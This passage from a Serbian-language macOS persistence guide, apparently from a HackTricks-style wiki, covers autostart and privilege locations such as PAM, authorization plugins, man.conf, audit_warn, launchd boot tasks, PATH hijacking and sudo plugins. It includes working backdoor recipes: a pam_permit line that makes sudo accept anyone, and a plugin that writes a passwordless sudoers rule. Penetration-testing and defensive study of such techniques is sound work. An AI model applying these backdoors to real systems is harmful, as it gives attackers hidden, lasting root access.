> **Istorijski mehanizam:** Na testnoj mašini macOS 26.5.2 nedostaju `/usr/sbin/periodic`, `/etc/defaults/periodic.conf`, `/etc/periodic` i launch daemon-i `com.apple.periodic-*`. Nemojte pretpostavljati da će kreiranje direktorijuma `/etc/periodic` na aktuelnom sistemu zakazati izvršavanje njegovog sadržaja. Pre upotrebe primera ispod proverite da li postoje i komanda i omogućen scheduler u ciljnom izdanju.

Opis: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)<sup>[[27]](#references)</sup>

- Korisno za sandbox bypass: [🟠](https://emojipedia.org/large-orange-circle)
  - Potreban je root pristup
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
  - Potreban je root pristup
  - **Okidač**: Kada dođe vreme
- `/etc/daily.local`, `/etc/weekly.local` ili `/etc/monthly.local`
  - Potreban je root pristup
  - **Okidač**: Kada dođe vreme

#### Opis i eksploatacija

U starijim izdanjima, izvršavanje periodic skripti (**`/etc/periodic`**) zakazivali su **launch daemon-i** u `/System/Library/LaunchDaemons/com.apple.periodic*`. Od macOS Big Sur 11.5, periodic runner je izvršavao skripte u periodic direktorijumima kao **vlasnik svake datoteke**, čime je zatvoren raniji put za eskalaciju privilegija.<sup>[[27]](#references)</sup> Komande i listing-i direktorijuma u nastavku predstavljaju istorijski izlaz, a ne rezultat testa na macOS 26.5.2.

```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```

Postoje i druge periodične skripte koje će se izvršavati, navedene u **`/etc/defaults/periodic.conf`**:

```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```

Na starijim sistemima na kojima su `periodic` i njegovi launch daemons instalirani i omogućeni, `/etc/daily.local`, `/etc/weekly.local` i `/etc/monthly.local` predstavljali su dodatne puteve za izvršavanje. Bezopasna provera samo za čitanje je:

```bash
test -x /usr/sbin/periodic && ls /System/Library/LaunchDaemons/com.apple.periodic-*.plist
```

> [!WARNING]
> Pravilo zasnovano na vlasniku primenjivalo se na skripte direktno u periodičnim direktorijumima. Istorijski omotač `999.local` učitavao je `/etc/daily.local`, `/etc/weekly.local` ili `/etc/monthly.local` bez iste provere vlasništva; kada se planer izvršavao kao root, ove lokalne datoteke izvršavale su se kao root. Ova razlika i promena u Big Sur 11.5 dokumentovane su u [originalnom istraživanju](https://theevilbit.github.io/beyond/beyond_0019/). Ne treba pretpostavljati da je bilo koja od ovih putanja aktivna ako `periodic` ne postoji.

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/software-information/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)<sup>[[28]](#references)</sup>

- Korisno za zaobilaženje sandboxa: [🟠](https://emojipedia.org/large-orange-circle)
  - Ali morate biti root
- Zaobilaženje TCC-a: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- Root je uvek potreban

#### Opis i eksploatacija

Pošto je PAM više usmeren na **postojanost** i malware nego na jednostavno izvršavanje unutar macOS-a, ovaj blog neće dati detaljno objašnjenje. **Pročitajte writeupove da biste bolje razumeli ovu tehniku.**<sup>[[28]](#references)</sup>

Proverite PAM module pomoću:

```bash
ls -l /etc/pam.d
```

Tehnika za održavanje prisustva/povećanje privilegija zloupotrebom PAM-a jednostavna je kao izmena modula /etc/pam.d/sudo, dodavanjem sledeće linije na početak:

```bash
auth       sufficient     pam_permit.so
```

Dakle, **izgledaće** otprilike ovako:

```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```

I zato će svaki pokušaj korišćenja **`sudo` funkcionisati**.

> [!CAUTION]
> Imajte na umu da je ovaj direktorijum zaštićen pomoću TCC-a, pa je vrlo verovatno da će korisnik dobiti upit za pristup.

Još jedan dobar primer je `su`, gde možete videti da je moguće proslediti parametre i PAM modulima (a mogli biste i da postavite backdoor u ovu datoteku):

```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```

### Authorization Plugins

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)<sup>[[29]](#references)</sup>\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)<sup>[[30]](#references)</sup>

- Korisno za zaobilaženje sandboxa: [🟠](https://emojipedia.org/large-orange-circle)
  - Ali morate biti root i napraviti dodatne konfiguracije
- Zaobilaženje TCC-a: ???

#### Lokacija

- `/Library/Security/SecurityAgentPlugins/`
  - Potreban je root
  - Potrebno je i konfigurisati bazu podataka za autorizaciju tako da koristi plugin

#### Opis i eksploatacija

Možete napraviti authorization plugin koji će se izvršavati kada se korisnik prijavi, kako biste održali postojanost. Za više informacija o tome kako napraviti jedan od ovih plugina, pogledajte prethodne writeupove (i budite pažljivi — loše napisan plugin može da vam onemogući pristup sistemu, pa ćete morati da očistite Mac iz recovery mode-a).<sup>[[29]](#references)[[30]](#references)</sup>

```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
    NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
    system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```

**Premestite** paket na lokaciju sa koje će biti učitan:

```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```

Na kraju dodajte **pravilo** za učitavanje ovog dodatka:

```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
            <key>class</key>
            <string>evaluate-mechanisms</string>
            <key>mechanisms</key>
            <array>
                <string>CustomAuth:login,privileged</string>
            </array>
        </dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```

**`evaluate-mechanisms`** će obavestiti authorization framework da treba da **pozove spoljašnji mehanizam za autorizaciju**. Pored toga, **`privileged`** će omogućiti da se izvrši kao root.

Pokrenite ga pomoću:

```bash
security authorize com.asdf.asdf
```

A zatim bi **staff grupa trebalo da ima sudo** pristup (pročitajte `/etc/sudoers` da biste to potvrdili).

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)<sup>[[31]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [🟠](https://emojipedia.org/large-orange-circle)
  - Ali morate biti root, a korisnik mora da koristi man
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- **`/private/etc/man.conf`**
  - Potrebna su root ovlašćenja
  - **`/private/etc/man.conf`**: Kad god se koristi man

#### Opis i eksploatacija

Konfiguraciona datoteka **`/private/etc/man.conf`** određuje binarnu datoteku/skriptu koja se koristi pri otvaranju man dokumentacionih fajlova. Zato se putanja do izvršne datoteke može izmeniti tako da se svaki put kada korisnik koristi man za čitanje dokumentacije izvrši backdoor.<sup>[[31]](#references)</sup>

Na primer, postavite u **`/private/etc/man.conf`**:

```
MANPAGER /tmp/view
```

A zatim kreirajte `/tmp/view` kao:

```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```

### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0025/](https://theevilbit.github.io/beyond/beyond_0025/)<sup>[[32]](#references)</sup>

- Korisno za bypass sandbox-a: [🟠](https://emojipedia.org/large-orange-circle)
  - Ali morate biti root i Apache mora da radi
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)
  - Httpd nema entitlements

#### Lokacija

- **`/etc/apache2/httpd.conf`**
  - Potreban je root
  - Okidač: Kada se Apache2 pokrene

#### Opis i eksploatacija

Možete navesti u `/etc/apache2/httpd.conf` da učita modul dodavanjem linije kao što je:<sup>[[32]](#references)</sup>

```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```

Na ovaj način će Apache učitati vaš kompajlirani modul. Jedino je potrebno da ga **potpišete važećim Apple sertifikatom** ili da **dodate novi pouzdani sertifikat** u sistem i **potpišete ga** njime.

Zatim, ako je potrebno, da biste se uverili da će server biti pokrenut, možete da izvršite:

```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```

Primer koda za Dylb:

```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
     printf("[+] dylib constructor called from %s\n", argv[0]);
     syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```

### BSM audit framework

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)<sup>[[33]](#references)</sup>

- Korisno za zaobilaženje sandboxa: [🟠](https://emojipedia.org/large-orange-circle)
  - Ali morate biti root, auditd mora da radi i mora da izazove upozorenje
- TCC bypass: [🔴](https://emojipedia.org/large-red-circle)

#### Lokacija

- **`/etc/security/audit_warn`**
  - Potreban je root
  - **Okidač**: Kada auditd otkrije upozorenje

#### Opis i exploit

Kad god auditd otkrije upozorenje, izvršava se skripta **`/etc/security/audit_warn`**. Zato biste mogli da dodate svoj payload u nju.<sup>[[33]](#references)</sup>

```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```

Možete prinudno da izazovete upozorenje pomoću `sudo audit -n`.

### Stavke pri pokretanju

> [!CAUTION] > **Ovo je zastarelo, pa u tim direktorijumima ne bi trebalo ništa da se pronađe.**

**StartupItem** je direktorijum koji bi trebalo da se nalazi u direktorijumu `/Library/StartupItems/` ili `/System/Library/StartupItems/`. Kada se ovaj direktorijum napravi, mora da sadrži dve određene datoteke:

1. **rc skriptu**: shell skriptu koja se izvršava pri pokretanju.
2. **plist datoteku**, nazvanu `StartupParameters.plist`, koja sadrži razna podešavanja konfiguracije.

Uverite se da su i rc skripta i datoteka `StartupParameters.plist` pravilno smeštene u direktorijum **StartupItem** kako bi ih proces pokretanja prepoznao i koristio.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Description</key>
        <string>This is a description of this service</string>
    <key>OrderPreference</key>
        <string>None</string> <!--Other req services to execute before this -->
    <key>Provides</key>
    <array>
        <string>superservicename</string> <!--Name of the services provided by this file -->
    </array>
</dict>
</plist>
```

{{#endtab}}

{{#tab name="superservicename"}}

```bash
#!/bin/sh
. /etc/rc.common

StartService(){
    touch /tmp/superservicestarted
}

StopService(){
    rm /tmp/superservicestarted
}

RestartService(){
    echo "Restarting"
}

RunService "$1"
```

{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Ne mogu da pronađem ovu komponentu u svom macOS-u, pa za više informacija pogledajte writeup

Writeup: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)<sup>[[34]](#references)</sup>

Apple je uveo **emond**, mehanizam za logovanje koji deluje nedovršeno ili možda napušteno, ali je i dalje dostupan. Iako nije naročito koristan administratoru Mac računara, ova slabo poznata usluga mogla bi akterima pretnji poslužiti kao suptilan metod postojanosti, koji bi verovatno prošao nezapaženo kod većine macOS administratora.<sup>[[34]](#references)</sup>

Onima koji znaju za njegovo postojanje, prepoznavanje zlonamerne upotrebe **emond**-a jednostavno je. Sistemski LaunchDaemon za ovu uslugu traži skripte za izvršavanje u jednom direktorijumu. Za proveru se može upotrebiti sledeća komanda:

```bash
ls -l /private/var/db/emondClients
```

### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)<sup>[[3]](#references)</sup>

#### Lokacija

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
  - Potreban root
  - **Okidač**: Uz XQuartz

#### Opis i exploit

XQuartz **više nije instaliran u macOS-u**, pa za više informacija pogledajte writeup.<sup>[[3]](#references)</sup>

### ~~kext~~

> [!CAUTION]
> Instaliranje kext-a je toliko komplikovano, čak i kao root, da se ne smatra praktičnom tehnikom za zaobilaženje sandbox-a ili persistence, osim ako nemate exploit.

#### Lokacija

Da bi se KEXT instalirao kao stavka za pokretanje, mora biti **instaliran na jednoj od sledećih lokacija**:

- `/System/Library/Extensions`
  - KEXT datoteke ugrađene u operativni sistem OS X.
- `/Library/Extensions`
  - KEXT datoteke koje je instalirao softver treće strane

Možete izlistati trenutno učitane kext datoteke pomoću:

```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```

Za više informacija o [**kernel extensions pogledajte ovaj odeljak**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)<sup>[[35]](#references)</sup>

#### Lokacija

- **`/usr/local/bin/amstoold`**
  - Potreban je root pristup

#### Opis i eksploatacija

Izgleda da je `plist` iz `/System/Library/LaunchAgents/com.apple.amstoold.plist` koristio ovaj binarni fajl i pritom izlagao XPC servis... stvar je u tome što binarni fajl nije postojao, pa ste mogli da postavite nešto na to mesto i kada se pozove XPC servis, pozvao bi se vaš binarni fajl.<sup>[[35]](#references)</sup>

Više ne mogu da pronađem ovo u svom macOS-u.

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)<sup>[[36]](#references)</sup>

#### Lokacija

- **`/Library/Preferences/Xsan/.xsanrc`**
  - Potreban je root pristup
  - **Okidač**: Kada se servis pokrene (retko)

#### Opis i eksploatacija

Izgleda da se ova skripta ne pokreće često, a nisam mogao ni da je pronađem u svom macOS-u, pa pogledajte writeup za više informacija.<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **Ovo ne funkcioniše u novijim verzijama macOS-a**

Ovde je moguće postaviti i **komande koje će se izvršiti pri pokretanju.** Primer standardne rc.common skripte:

```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
    local test

    if [ -z "${NETWORKUP:=}" ]; then
	test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
	if [ "${test}" -gt 0 ]; then
	    NETWORKUP="-YES-"
	else
	    NETWORKUP="-NO-"
	fi
    fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
    local program="$1"
    local pidfile="${PIDFILE:=/var/run/${program}.pid}"
    local     pid=""

    if [ -f "${pidfile}" ]; then
	pid=$(head -1 "${pidfile}")
	if ! kill -0 "${pid}" 2> /dev/null; then
	    echo "Bad pid file $pidfile; deleting."
	    pid=""
	    rm -f "${pidfile}"
	fi
    fi

    if [ -n "${pid}" ]; then
	echo "${pid}"
	return 0
    else
	return 1
    fi
}

#
# Generic action handler
#
RunService ()
{
    case $1 in
      start  ) StartService   ;;
      stop   ) StopService    ;;
      restart) RestartService ;;
      *      ) echo "$0: unknown argument: $1";;
    esac
}
```

### launchd zadaci pri pokretanju

Writeup: [https://theevilbit.github.io/beyond/beyond_0034/](https://theevilbit.github.io/beyond/beyond_0034/)<sup>[[40]](#references)</sup>

- Korisno za zaobilaženje sandbox-a: [🔴](https://emojipedia.org/large-red-circle) (potreban je root)
- Potreban je root, uz **SIP bypass** ili dozvolu **`kTCCServiceSystemPolicySysAdminFiles`**/Full Disk Access, u zavisnosti od putanje

#### Lokacija

`launchd` ugrađuje plist u svoj odeljak **`__TEXT,__config`**, u kom su opisani rani „boot tasks“. Nekoliko referentnih skripti/binarnh datoteka koje **ne postoje** podrazumevano, a napadač može da ih kreira:

- SIP-bypass skup: **`/Library/Apple/usr/libexec/finish_demo_restore`**, **`/private/var/install/shutdown_installer_tasks`**, **`/private/var/install/deferred_install`**
- TCC/FDA skup: **`/etc/rc.server`**, **`/etc/rc.cdrom`**, **`/etc/rc.netboot`** (`rc.netboot` postoji unapred samo u Sequoia+)

#### Opis i eksploatacija

Izdvojite ugrađenu tabelu zadataka da biste videli koje će datoteke `launchd` pokrenuti i koji su ključevi podržani (`Program`, `ProgramArguments`, `PerformAfterUserspaceReboot`, `RequireSuccess`…):

```bash
otool -X -s __TEXT __config /sbin/launchd | awk '{print $2 $3 $4 $5}' | \
  xxd -r -p | hexdump -v -e '1/4 "%08x"' -e '"\n"' | xxd -r -p
```

Kreiranje jedne od navedenih datoteka (npr. `/etc/rc.server`) dovodi do toga da je `launchd` izvrši pri sledećem ponovnom pokretanju (korisničkog prostora). Najkorisniji unosi su ograničeni SIP-om ili zahtevaju TCC SysAdminFiles/Full Disk Access, pa je ovo tehnika na nivou root-a koja se aktivira ponovnim pokretanjem.<sup>[[40]](#references)</sup>

### ~~NVRAM (`apple-trusted-trampoline`)~~

Opis: [https://theevilbit.github.io/beyond/beyond_0035/](https://theevilbit.github.io/beyond/beyond_0035/)<sup>[[41]](#references)</sup>

Zadatak pri pokretanju `rc.trampoline` izvršava **platformski binarni fajl (potpisan od strane Apple-a)** koji je pri pokretanju sačuvan u NVRAM promenljivoj `apple-trusted-trampoline`, ali **samo kada je boot-arg `rc.trampoline=1` postavljen, a SIP onemogućen** (uz ograničenje veličine od oko 390&nbsp;KB i uslov da se izvršavanje ne blokira i brzo završi). Pošto zahteva **root + onemogućen SIP + payload potpisan od strane Apple-a**, praktično je neupotrebljivo za stvarnu perzistenciju i ovde je navedeno samo radi potpunosti.<sup>[[41]](#references)</sup>

### /etc/paths и /etc/paths.d (PATH hijack)

- Korisno za zaobilaženje sandbox-a: [🔴](https://emojipedia.org/large-red-circle) (za upis su potrebna root ovlašćenja)
- Potreban je root

#### Lokacija

- **`/etc/paths`** и **`/etc/paths.d/*`** — čita ih **`path_helper`** (poziva se iz `/etc/zprofile`) da bi se pri prijavi formirao podrazumevani `PATH`.

#### Opis i eksploatacija

Obe lokacije su u vlasništvu root-a. Dodavanje direktorijuma pod kontrolom napadača na početak putanje (izmenom `/etc/paths` ili dodavanjem datoteke u `/etc/paths.d/`) čini da se taj direktorijum nađe na početku `PATH` promenljive svake nove shell sesije pri prijavi, pa zlonamerni binarni fajl nazvan po uobičajenoj komandi (`ls`, `git`, …) **zaseni** stvarni fajl i pokrene se sledeći put kada žrtva izvrši tu komandu.

```bash
# e.g. Homebrew already ships a /etc/paths.d entry; an attacker drops their own
echo "/private/tmp/evil" | sudo tee /etc/paths.d/00-evil
# -> /private/tmp/evil is prepended to PATH for new login shells
```

### storagekitd SIP Bypass (CVE-2024-44243)

Writeup: [https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)<sup>[[46]](#references)</sup>

- Korisno za zaobilaženje sandboxa: [🔴](https://emojipedia.org/large-red-circle) (potreban je root)
- Potreban je root; rezultat **zaobilazi SIP**. Pogođene verzije macOS-a **15.0–15.1**, ispravljeno u **15.2**

#### Lokacija

- Postavite filesystem bundle u **`/Library/Filesystems/`**.

#### Opis i iskorišćavanje

`storagekitd` poseduje entitlement **`com.apple.rootless.install.heritable`** i pokretao je binarne datoteke filesystem bundle-ova sa **nasleđenom** mogućnošću zaobilaženja SIP-a. Postavljanjem zlonamernog filesystem bundle-a, napadač je mogao da pokrene kod uz zaobilaženje SIP-a i instalira **perzistentne kernel ekstenzije** ili da piše u direktorijume `LaunchDaemon` zaštićene SIP-om — perzistencija koja opstaje i zaobilazi uobičajene zaštite.<sup>[[46]](#references)</sup> Apple je ispravio problem u macOS Sequoia 15.2.

### sudo plugins (/etc/sudo.conf)

Writeup: [On Writing Sudo Plugins (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)<sup>[[51]](#references)</sup>

- Korisno za zaobilaženje sandboxa: [🔴](https://emojipedia.org/large-red-circle) (potreban je root za pisanje u `/etc/sudo.conf`)
- Root je potreban za instalaciju; dodatak se zatim pokreće pri **svakom pozivanju `sudo`** (u setuid-root kontekstu)

#### Lokacija

- **`/etc/sudo.conf`** — linije `Plugin` učitavaju deljene objekte iz **`/usr/libexec/sudo/`** (ili sa apsolutne putanje). Podrazumevano ne postoji (sudo koristi ugrađenu politiku), pa je njegovo kreiranje jednostavan hook.

#### Opis i iskorišćavanje

`sudo` učitava dodatke za politiku/odobravanje/reviziju iz `/etc/sudo.conf`. Pošto je `sudo` setuid-root, zlonamerni dodatak u obliku deljenog objekta izvršava se sa **root privilegijama svaki put kada bilo koji korisnik pokrene `sudo`** — obezbeđujući dugotrajnu root perzistenciju koja ujedno ima uvid u svaku sudo komandu.<sup>[[51]](#references)</sup> macOS isporučuje sudo 1.9.x, koji podržava API za dodatke.

```bash
# As root: load a malicious audit/approval plugin on every sudo
cat > /etc/sudo.conf <<'CONF'
Plugin sudoers_policy sudoers.so
Plugin ht_audit /usr/libexec/sudo/ht_audit.so
CONF
# ht_audit.so's constructor / audit_open runs as root on the next `sudo <anything>`
```

### CoreMediaIO DAL Plug-Ins

Opis: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>\
Minimalni primer: [https://github.com/johnboiles/coremediaio-dal-minimal-example](https://github.com/johnboiles/coremediaio-dal-minimal-example)<sup>[[54]](#references)</sup>

- **Zastareli mehanizam:** Zastareo od macOS 12.3. macOS 14.1 i novije verzije podrazumevano onemogućavaju zastarele video-dodatke. Korisnik mora da vrati podršku za zastareli video iz Recovery okruženja da bi ovaj način rada mogao da funkcioniše; sam direktorijum sa dozvolom za upis nije dovoljan. [Apple-ova aktuelna uputstva za podršku](https://support.apple.com/en-us/108387).
- Za upis u direktorijum dodataka potreban je root. Izvršavanje koda zavisi od kompatibilnog klijenta koji i dalje učitava DAL dodatke; ovo nije testirano tokom rada na macOS 26.

#### Lokacija

- **`/Library/CoreMediaIO/Plug-Ins/DAL/*.plugin`**
  - Potreban je root
  - **Okidač:** Kompatibilan klijent kamere nabraja uređaje **nakon što je vraćena podrška za zastarele dodatke**. Provera valjanosti biblioteka u klijentu može da blokira dodatak treće strane.

#### Opis i eksploatacija

CoreMediaIO **DAL** (Device Abstraction Layer) dodatke su neke aplikacije za kameru učitavale unutar procesa. U Apple-ovoj [prezentaciji o camera-extension](https://developer.apple.com/videos/play/wwdc2022/10022/) izričito se navodi da zastareli DAL dodaci **nisu** radili sa FaceTime, QuickTime Player ili Photo Booth, kao i da mnogi drugi klijenti sprovode proveru valjanosti biblioteka. Savremene [Core Media I/O extensions](https://developer.apple.com/documentation/coremediaio) rade izvan procesa, uz zaseban model instalacije i odobravanja. Istorijska tehnika rada unutar procesa ne podrazumeva opšte zaobilaženje Camera TCC na aktuelnom macOS-u.<sup>[[53]](#references)[[54]](#references)</sup>

Posmatranje samo uz čitanje na macOS 26: `/Library/CoreMediaIO/Plug-Ins/DAL` postoji i u vlasništvu je root-a. Nije provereno da li je podrška za zastarele dodatke omogućena niti da li ih neki klijent učitava.

### Directory Service Plugins

Opis: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- **Zastareli, uslovni mehanizam:** Za instalaciju je potreban root, kao i dodatak koji je zaista konfigurisan i učitan. API za dodatke DirectoryService je zastareo; pre nego što ovo smatrate okidačem pri pokretanju, proverite konfiguraciju Open Directory-a na ciljnom Mac-u.

#### Lokacija

- **`/Library/DirectoryServices/PlugIns/*.dsplug`**
  - Potreban je root
  - **Okidač:** `dspluginhelperd` učitava odgovarajući konfigurisani dodatak kada ga Open Directory zatreba. U [Apple-ovom vodiču za izvršno okruženje dodataka](https://developer.apple.com/library/archive/documentation/Networking/Conceptual/Open_Dir_Plugin/RuntimeEnviornment/RuntimeEnviornment.html) piše da se dodaci koji nisu konfigurisani za pokretanje mogu učitati odloženo prilikom otvaranja njihovog čvora.

#### Opis i eksploatacija

`dspluginhelperd` podržava zastarele pakete dodataka za DirectoryService. Zlonamerni dodatak može predstavljati putanju za izvršavanje sa privilegijama kada je zastareli dodatak prihvaćen i aktiviran; to je različito od PAM-a i Authorization Plugins. Samo postojanje direktorijuma ne dokazuje da će se novo upisani dodatak pokrenuti pri sledećem podizanju sistema. Lokalni priručnici za macOS 26.5, `dspluginhelperd(8)` i `opendirectoryd(8)`, i dalje navode pomoćni program i ovu zastarelu putanju.<sup>[[53]](#references)</sup>

Posmatranje samo uz čitanje na macOS 26: `/Library/DirectoryServices/PlugIns` i `/usr/libexec/dspluginhelperd` postoje. Tokom ovog testa nijedan dodatak nije instaliran, konfigurisan niti učitan.

## Tehnike i alati za postojanost

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## References

- [1] [2025, godina Infostealer-a](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [Pored dobrih starih LaunchAgents-a - 1 - datoteke za pokretanje shell-a](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [Pored dobrih starih LaunchAgents-a - 18 - X11 i XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [Pored dobrih starih LaunchAgents-a - 21 - ponovo otvorene aplikacije](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [Pored dobrih starih LaunchAgents-a - 20 - Terminal podešavanja](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [Pored dobrih starih LaunchAgents-a - 13 - audio-dodaci](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Audio Unit dodaci (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [Pored dobrih starih LaunchAgents-a - 12 - QuickLook dodaci](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [Pored dobrih starih LaunchAgents-a - 22 - LoginHook i LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [Pored dobrih starih LaunchAgents-a - 4 - cron poslovi](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [Pored dobrih starih LaunchAgents-a - 2 - pokretanje iTerm2](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [Pored dobrih starih LaunchAgents-a - 7 - xbar dodaci](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [Pored dobrih starih LaunchAgents-a - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [Pored dobrih starih LaunchAgents-a - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [Pored dobrih starih LaunchAgents-a - 3 - stavke za prijavu](https://theevilbit.github.io/beyond/beyond_0003/)
